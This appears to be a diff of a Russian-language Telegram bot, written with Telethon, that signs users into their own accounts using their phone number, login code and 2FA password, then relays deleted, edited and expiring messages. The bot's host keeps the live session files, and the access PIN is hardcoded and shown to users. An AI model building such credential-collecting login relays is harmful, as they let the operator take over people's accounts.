@@ -1,7 +1,6 @@
 import os
 import asyncio
 import logging
-import random
 from datetime import datetime, timedelta
 from telethon import TelegramClient, events
 from telethon.errors import (
@@ -23,12 +22,12 @@ API_HASH = os.environ.get('API_HASH')
 
 bot = TelegramClient('bot', API_ID, API_HASH)
 
-# ========== БАЗА ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ ==========
-users_db = {}  # {user_id: {'phones': ['+7900...', ...], 'active_client': None, 'settings': {}}}
+# ========== БАЗА ДАННЫХ ==========
+users_db = {}  # {user_id: {'phones': [], 'active_client': None, 'settings': {}}}
 user_sessions = {}  # Временные сессии для входа
 authorized_users = set()  # Кто ввёл пин-код
 ACCESS_PIN = "5482"
-message_cache = {}
+message_cache = {}  # Кэш сообщений для мониторинга
 user_clients = {}  # Активные клиенты после входа
 timers = {}  # Таймеры
 flood_until = {}  # Блокировки
@@ -36,34 +35,25 @@ user_contacts = {}  # Временные контакты
 
 # ========== ФУНКЦИИ АНИМАЦИИ ==========
 async def show_progress(event, text, steps=10, delay=0.3):
-    """Показывает прогресс-бар с анимацией"""
     msg = await event.reply(f"🦆 **{text}**\n\n[                    ] 0%")
-    
     for i in range(steps + 1):
         percent = i * 10
         bar = '█' * i + '░' * (steps - i)
         await msg.edit(f"🦆 **{text}**\n\n[{bar}] {percent}%")
         await asyncio.sleep(delay)
-    
     return msg
 
-async def show_loading_animation(event, text, duration=3):
-    """Анимация загрузки на 3 секунды"""
-    frames = ['🦆⠋', '🦆⠙', '🦆⠹', '🦆⠸', '🦆⠼', '🦆⠴', '🦆⠦', '🦆⠧', '🦆⠇', '🦆⠏']
+async def show_loading(event, text, duration=3):
+    frames = ['🦆⠋', '🦆⠙', '🦆⠹', '🦆⠸', '🦆⠼', '🦆⠴', '🦆⠦', '🦆⠧']
     msg = await event.reply(f"{frames[0]} {text}")
-    
     for i in range(duration * 2):
-        frame = frames[i % len(frames)]
-        await msg.edit(f"{frame} {text}")
+        await msg.edit(f"{frames[i % len(frames)]} {text}")
         await asyncio.sleep(0.5)
-    
     return msg
 
 # ========== ТАЙМЕРЫ ==========
 async def show_unlock_timer(event, user_id, seconds):
-    """Показывает таймер разблокировки (обновление каждую секунду)"""
     msg = await event.reply("🦆 **⏳ Загружаю таймер...**")
-    
     unlock_time = datetime.now() + timedelta(seconds=seconds)
     flood_until[user_id] = unlock_time
     
@@ -72,93 +62,37 @@ async def show_unlock_timer(event, user_id, seconds):
         hours = remaining // 3600
         minutes = (remaining % 3600) // 60
         secs = remaining % 60
-        
-        total = seconds
         progress = int(((seconds - remaining) / seconds) * 20)
         bar = '█' * progress + '░' * (20 - progress)
         
-        # Получаем сохранённые номера пользователя
-        user_phones = users_db.get(user_id, {}).get('phones', [])
-        phone_display = user_phones[0] if user_phones else 'Неизвестно'
-        
-        try:
-            await msg.edit(
-                f"🦆 **🔒 НОМЕР ЗАБЛОКИРОВАН**\n\n"
-                f"⏱ **До разблокировки:**\n"
-                f"**{hours:02d}:{minutes:02d}:{secs:02d}**\n"
-                f"└ {bar}\n\n"
-                f"📱 **Номер:** {phone_display}\n"
-                f"❌ Слишком много попыток входа\n\n"
-                f"👇 **Кнопки:**",
-                buttons=[
-                    [Button.text("🔄 Проверить статус")],
-                    [Button.text("📱 Отправить контакт")],
-                    [Button.text("📞 Другой номер")],
-                    [Button.text("🔙 Назад")]
-                ]
-            )
-        except:
-            pass
-        
+        await msg.edit(
+            f"🦆 **🔒 НОМЕР ЗАБЛОКИРОВАН**\n\n"
+            f"⏱ **{hours:02d}:{minutes:02d}:{secs:02d}**\n"
+            f"└ {bar}\n\n"
+            f"❌ Слишком много попыток"
+        )
         await asyncio.sleep(1)
     
-    await msg.edit(
-        f"🦆 **✅ НОМЕР РАЗБЛОКИРОВАН!**\n\n"
-        f"Теперь можно войти заново.",
-        buttons=[
-            [Button.text("🔄 Начать заново")],
-            [Button.text("📱 Отправить контакт")]
-        ]
-    )
-    
+    await msg.edit("🦆 **✅ НОМЕР РАЗБЛОКИРОВАН!**")
     if user_id in flood_until:
         del flood_until[user_id]
 
 async def start_code_timer(user_id, chat_id, seconds=120):
-    """Таймер на ввод кода (обновление каждую секунду)"""
-    msg = await bot.send_message(
-        chat_id,
-        f"🦆 **⏳ Код отправлен!**\n\n"
-        f"⏱ **{seconds//60}:{seconds%60:02d}**\n"
-        f"└ {'█' * 10}░░\n\n"
-        f"📨 Проверь Telegram"
-    )
-    
-    timers[user_id] = {
-        'message': msg,
-        'end_time': datetime.now() + timedelta(seconds=seconds),
-        'running': True
-    }
+    msg = await bot.send_message(chat_id, f"⏳ **{seconds//60}:{seconds%60:02d}**")
+    timers[user_id] = {'message': msg, 'running': True}
     
     for i in range(seconds):
         if not timers.get(user_id, {}).get('running'):
             break
-            
         remaining = seconds - i
-        minutes = remaining // 60
-        secs = remaining % 60
+        mins, secs = remaining // 60, remaining % 60
         progress = int((i / seconds) * 20)
         bar = '█' * progress + '░' * (20 - progress)
-        
-        try:
-            await msg.edit(
-                f"🦆 **⏳ Код действителен**\n\n"
-                f"⏱ **{minutes}:{secs:02d}**\n"
-                f"└ {bar}\n\n"
-                f"✍️ **Введи код:**"
-            )
-        except:
-            pass
-        
+        await msg.edit(f"⏳ **{mins}:{secs:02d}**\n└ {bar}")
         await asyncio.sleep(1)
     
     if timers.get(user_id, {}).get('running'):
-        await msg.edit(
-            "🦆 **⌛ ВРЕМЯ ВЫШЛО!**\n\n"
-            "Код больше недействителен.\n"
-            "Нажми /start чтобы начать заново."
-        )
-    
+        await msg.edit("⌛ **Время вышло!**")
     if user_id in timers:
         del timers[user_id]
 
@@ -167,47 +101,13 @@ def stop_timer(user_id):
         timers[user_id]['running'] = False
         del timers[user_id]
 
-# ========== РЕГИСТРАЦИЯ И СОХРАНЕНИЕ НОМЕРОВ ==========
+# ========== СОХРАНЕНИЕ НОМЕРОВ ==========
 async def save_user_phone(user_id, phone):
-    """Сохраняет номер телефона пользователя"""
     if user_id not in users_db:
         users_db[user_id] = {'phones': [], 'active_client': None, 'settings': {}}
-    
     if phone not in users_db[user_id]['phones']:
         users_db[user_id]['phones'].append(phone)
-        # Ограничиваем до 5 номеров
-        if len(users_db[user_id]['phones']) > 5:
-            users_db[user_id]['phones'] = users_db[user_id]['phones'][-5:]
-
-async def show_saved_phones(event, user_id):
-    """Показывает сохранённые номера пользователя"""
-    user_data = users_db.get(user_id, {'phones': []})
-    phones = user_data['phones']
-    
-    if not phones:
-        await event.reply(
-            f"🦆 **📱 У вас нет сохранённых номеров**\n\n"
-            f"Отправьте контакт или введите номер вручную.",
-            buttons=[
-                [Button.text("📱 Отправить контакт")],
-                [Button.text("📞 Ввести номер")]
-            ]
-        )
-        return
-    
-    buttons = []
-    for i, phone in enumerate(phones[:5]):
-        buttons.append([Button.text(f"📞 {i+1}️⃣ {phone}")])
-    
-    buttons.append([Button.text("📱 Отправить контакт")])
-    buttons.append([Button.text("📞 Ввести другой")])
-    buttons.append([Button.text("🔙 Назад")])
-    
-    await event.reply(
-        f"🦆 **📱 ВАШИ СОХРАНЁННЫЕ НОМЕРА**\n\n"
-        f"Выберите номер для входа:",
-        buttons=buttons
-    )
+        users_db[user_id]['phones'] = users_db[user_id]['phones'][-5:]
 
 # ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
 @bot.on(events.NewMessage)
@@ -225,85 +125,68 @@ async def handler(event):
     if user_id not in authorized_users:
         if text == ACCESS_PIN:
             authorized_users.add(user_id)
-            await show_progress(event, "Загрузка профиля", 10, 0.2)
+            await show_progress(event, "Загрузка", 5, 0.2)
             await event.reply(
-                f"🦆 **✅ Пин-код верный!**\n\n"
-                f"Добро пожаловать в систему управления аккаунтами.",
+                f"🦆 **✅ Пин-код верный!**",
                 buttons=[
-                    [Button.text("📱 Мои номера")],
-                    [Button.text("📞 Войти")],
-                    [Button.text("📱 Отправить контакт")],
-                    [Button.text("❓ Помощь")]
+                    [Button.text("📱 Отправить контакт", resize=True)],
+                    [Button.text("📞 Ввести номер")],
+                    [Button.text("📋 Мои номера")]
                 ]
             )
         else:
-            await event.reply(f"🦆 **❌ Неверный пин-код!**\nВведи: `5482`")
+            await event.reply(f"🔐 **Введи пин-код:** `5482`")
         return
 
     # === ГЛАВНОЕ МЕНЮ ===
-    if text == "/start" or text == "🔙 Назад" or text == "🔄 Начать заново":
+    if text == "/start":
         await event.reply(
-            f"🦆 **ГЛАВНОЕ МЕНЮ**\n\n"
-            f"Выберите действие:",
+            f"🦆 **Главное меню**",
             buttons=[
-                [Button.text("📱 Мои номера")],
-                [Button.text("📞 Войти")],
                 [Button.text("📱 Отправить контакт")],
-                [Button.text("⚙️ Настройки")],
-                [Button.text("❓ Помощь")]
+                [Button.text("📞 Ввести номер")],
+                [Button.text("📋 Мои номера")]
             ]
         )
-        return
-
-    # === ПОМОЩЬ ===
-    if text == "❓ Помощь":
-        await event.reply(
-            f"🦆 **ПОМОЩЬ**\n\n"
-            f"🔐 **Пин-код:** 5482\n"
-            f"📱 **Мои номера** — сохранённые номера\n"
-            f"📞 **Войти** — вход по номеру\n"
-            f"📱 **Отправить контакт** — поделиться номером\n"
-            f"⚙️ **Настройки** — изменить пароль, очистить историю\n\n"
-            f"⏳ **Таймеры** обновляются каждую секунду\n"
-            f"🦆 **Анимации** для всех операций"
-        )
-        return
-
-    # === МОИ НОМЕРА ===
-    if text == "📱 Мои номера":
-        await show_saved_phones(event, user_id)
-        return
-
-    # === ВОЙТИ ===
-    if text == "📞 Войти":
-        await show_saved_phones(event, user_id)
         return
 
     # === ОТПРАВИТЬ КОНТАКТ ===
     if text == "📱 Отправить контакт":
         await event.reply(
-            f"🦆 **📱 ПОДЕЛИТЬСЯ КОНТАКТОМ**\n\n"
-            f"Нажмите кнопку ниже, чтобы отправить свой номер.\n"
-            f"Этот номер будет сохранён в вашем профиле.",
+            f"📱 **Поделись контактом:**",
             buttons=[[Button.request_contact("📞 Поделиться контактом")]]
         )
         return
 
-    # === ВВЕСТИ ДРУГОЙ ===
-    if text == "📞 Ввести другой":
+    # === ВВЕСТИ НОМЕР ===
+    if text == "📞 Ввести номер":
         user_sessions[user_id] = {'step': 'waiting_phone'}
+        await event.reply("📞 **Введи номер:** +79001234567")
+        return
+
+    # === МОИ НОМЕРА ===
+    if text == "📋 Мои номера":
+        phones = users_db.get(user_id, {}).get('phones', [])
+        if not phones:
+            await event.reply("📭 **Нет сохранённых номеров**")
+            return
+        
+        buttons = []
+        for i, phone in enumerate(phones):
+            buttons.append([Button.text(f"📞 {i+1}️⃣ {phone}")])
+        buttons.append([Button.text("🔙 Назад")])
+        
         await event.reply(
-            f"🦆 **📞 ВВЕДИТЕ НОМЕР**\n\n"
-            f"Формат: `+79001234567`"
+            f"📱 **Твои номера:**\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(phones)]),
+            buttons=buttons
         )
         return
 
     # === ВЫБОР СОХРАНЁННОГО НОМЕРА ===
     if text.startswith("📞") and "️⃣" in text:
-        # Извлекаем индекс из кнопки (например "📞 1️⃣ +79001234567")
         parts = text.split()
         if len(parts) >= 3:
-            idx = int(parts[1][0]) - 1  # "1️⃣" → 0
+            idx = int(parts[1][0]) - 1
             phones = users_db.get(user_id, {}).get('phones', [])
             if idx < len(phones):
                 await process_phone(event, user_id, phones[idx])
@@ -326,157 +209,113 @@ async def handler(event):
 
 # ========== ОБРАБОТКА НОМЕРА ==========
 async def process_phone(event, user_id, phone):
-    """Обрабатывает номер и отправляет код"""
-    user_sessions[user_id] = {
-        'phone': phone,
-        'step': 'waiting_code'
-    }
-    
+    user_sessions[user_id] = {'phone': phone, 'step': 'waiting_code'}
     await save_user_phone(user_id, phone)
     
-    anim = await show_loading_animation(event, "Подключение к Telegram...", 3)
+    anim = await show_loading(event, "Подключение...", 2)
     
     try:
         client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
         await client.connect()
-        
-        sent_code = await client.send_code_request(phone)
+        sent = await client.send_code_request(phone)
         
         user_sessions[user_id]['client'] = client
-        user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
+        user_sessions[user_id]['code_hash'] = sent.phone_code_hash
         
-        await anim.edit("🦆 **✅ Код отправлен!**")
-        
-        # Таймер на 2 минуты
+        await anim.edit("✅ **Код отправлен!**")
         await start_code_timer(user_id, event.chat_id, 120)
         
     except FloodWaitError as e:
-        seconds = e.seconds
-        await show_unlock_timer(event, user_id, seconds)
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        
+        await show_unlock_timer(event, user_id, e.seconds)
+        del user_sessions[user_id]
     except Exception as e:
-        await anim.edit(f"🦆 **❌ Ошибка:** {e}")
-        if user_id in user_sessions:
-            del user_sessions[user_id]
+        await anim.edit(f"❌ **Ошибка:** {e}")
+        del user_sessions[user_id]
 
 # ========== ОБРАБОТКА КОДА ==========
 async def process_code(event, user_id, code):
-    """Обрабатывает введённый код"""
     session = user_sessions[user_id]
     client = session['client']
-    
     stop_timer(user_id)
     
-    anim = await show_loading_animation(event, "Проверка кода...", 2)
+    anim = await show_loading(event, "Проверка...", 2)
     
     try:
         await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
-        
         me = await client.get_me()
         user_clients[user_id] = client
         
         await anim.edit(
-            f"🦆 **✅ УСПЕШНЫЙ ВХОД!**\n\n"
-            f"👤 Аккаунт: @{me.username}\n"
-            f"🆔 ID: {me.id}\n"
-            f"📱 Номер: {session['phone']}\n\n"
+            f"✅ **Вход выполнен!**\n\n"
+            f"👤 @{me.username}\n"
             f"🔍 **Мониторинг запущен!**"
         )
-        
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        
+        del user_sessions[user_id]
         asyncio.create_task(monitor_user_chats(user_id, client))
         
     except SessionPasswordNeededError:
         user_sessions[user_id]['step'] = 'waiting_2fa'
-        await anim.edit(
-            f"🦆 **🔐 ТРЕБУЕТСЯ 2FA**\n\n"
-            f"Введите пароль двухфакторной аутентификации:"
-        )
-        
+        await anim.edit("🔐 **Введи пароль 2FA:**")
     except PhoneCodeInvalidError:
-        await anim.edit(
-            f"🦆 **❌ НЕВЕРНЫЙ КОД**\n\n"
-            f"Попробуйте ещё раз:"
-        )
+        await anim.edit("❌ **Неверный код!**")
         user_sessions[user_id]['step'] = 'waiting_code'
         await start_code_timer(user_id, event.chat_id, 120)
-        
     except PhoneCodeExpiredError:
-        await anim.edit(
-            f"🦆 **⌛ КОД ИСТЁК**\n\n"
-            f"Начните заново."
-        )
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        
+        await anim.edit("⌛ **Код истёк!**")
+        del user_sessions[user_id]
     except Exception as e:
-        await anim.edit(f"🦆 **❌ Ошибка:** {e}")
-        if user_id in user_sessions:
-            del user_sessions[user_id]
+        await anim.edit(f"❌ **Ошибка:** {e}")
+        del user_sessions[user_id]
 
 # ========== ОБРАБОТКА 2FA ==========
 async def process_2fa(event, user_id, password):
-    """Обрабатывает 2FA пароль"""
     session = user_sessions[user_id]
     client = session['client']
     
-    anim = await show_loading_animation(event, "Проверка пароля...", 2)
+    anim = await show_loading(event, "Проверка...", 2)
     
     try:
         await client.sign_in(password=password)
-        
         me = await client.get_me()
         user_clients[user_id] = client
         
         await anim.edit(
-            f"🦆 **✅ ВХОД С 2FA ВЫПОЛНЕН!**\n\n"
-            f"👤 Аккаунт: @{me.username}\n"
-            f"🆔 ID: {me.id}\n"
-            f"📱 Номер: {session['phone']}\n\n"
+            f"✅ **Вход с 2FA выполнен!**\n\n"
+            f"👤 @{me.username}\n"
             f"🔍 **Мониторинг запущен!**"
         )
-        
-        if user_id in user_sessions:
-            del user_sessions[user_id]
-        
+        del user_sessions[user_id]
         asyncio.create_task(monitor_user_chats(user_id, client))
-        
     except Exception as e:
-        await anim.edit(f"🦆 **❌ Ошибка:** {e}")
+        await anim.edit(f"❌ **Ошибка:** {e}")
 
-# ========== ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ==========
+# ========== ОБРАБОТКА КОНТАКТА ==========
 @bot.on(events.NewMessage(func=lambda e: e.message.contact))
 async def contact_handler(event):
     user_id = event.sender_id
     contact = event.message.contact
     
-    # Проверяем, что номер принадлежит этому пользователю
     if str(user_id) != str(contact.user_id):
-        await event.reply(f"🦆 **❌ Это не ваш номер!**")
+        await event.reply("❌ **Это не твой номер!**")
         return
     
     phone = contact.phone_number
     await save_user_phone(user_id, phone)
     
     await event.reply(
-        f"🦆 **📱 КОНТАКТ ПОЛУЧЕН!**\n\n"
-        f"📱 Номер: `{phone}`\n"
-        f"👤 Имя: {contact.first_name}\n\n"
-        f"✅ Номер сохранён в вашем профиле.\n\n"
-        f"**Войти под этим номером?**",
+        f"✅ **Контакт получен!**\n\n"
+        f"📱 {phone}\n"
+        f"👤 {contact.first_name}\n\n"
+        f"Войти сейчас?",
         buttons=[
             [Button.text("✅ Да, войти")],
-            [Button.text("📱 Мои номера")],
-            [Button.text("❌ Нет, отмена")]
+            [Button.text("📋 Мои номера")],
+            [Button.text("❌ Нет")]
         ]
     )
 
 @bot.on(events.NewMessage)
-async def confirm_contact_handler(event):
+async def confirm_handler(event):
     user_id = event.sender_id
     text = event.message.text
     
@@ -484,22 +323,33 @@ async def confirm_contact_handler(event):
         phones = users_db[user_id].get('phones', [])
         if phones:
             await process_phone(event, user_id, phones[-1])
-    elif text == "📱 Мои номера":
-        await show_saved_phones(event, user_id)
-    elif text == "❌ Нет, отмена":
-        await event.reply("🦆 **❌ Отменено**")
+    elif text == "📋 Мои номера":
+        phones = users_db.get(user_id, {}).get('phones', [])
+        if phones:
+            await event.reply(
+                f"📱 **Твои номера:**\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(phones)]),
+                buttons=[[Button.text("🔙 Назад")]]
+            )
+    elif text == "❌ Нет":
+        await event.reply("❌ **Отменено**")
 
 # ========== МОНИТОРИНГ ==========
 async def monitor_user_chats(user_id, client):
-    await bot.send_message(user_id, f"🦆 **🔍 МОНИТОРИНГ ЗАПУЩЕН!**")
+    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
     
     @client.on(events.MessageDeleted)
     async def on_delete(event):
-        await bot.send_message(user_id, f"🦆 **🗑 УДАЛЕНО** {len(event.deleted_ids)} сообщений")
+        for msg_id in event.deleted_ids:
+            await bot.send_message(user_id, f"🗑 **Удалено:** {msg_id}")
     
     @client.on(events.MessageEdited)
     async def on_edit(event):
-        await bot.send_message(user_id, f"🦆 **✏️ ИЗМЕНЕНО** сообщение")
+        await bot.send_message(user_id, f"✏️ **Изменено:** {event.message.text}")
+    
+    @client.on(events.NewMessage)
+    async def on_new(event):
+        if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
+            await bot.send_message(user_id, f"⏳ **Истекающее сообщение** в чате {event.chat_id}")
     
     await client.run_until_disconnected()
 
@@ -508,8 +358,6 @@ async def main():
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
-    logger.info(f"🦆 Полная система регистрации активна")
-    logger.info(f"⏳ Таймеры обновляются каждую секунду")
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
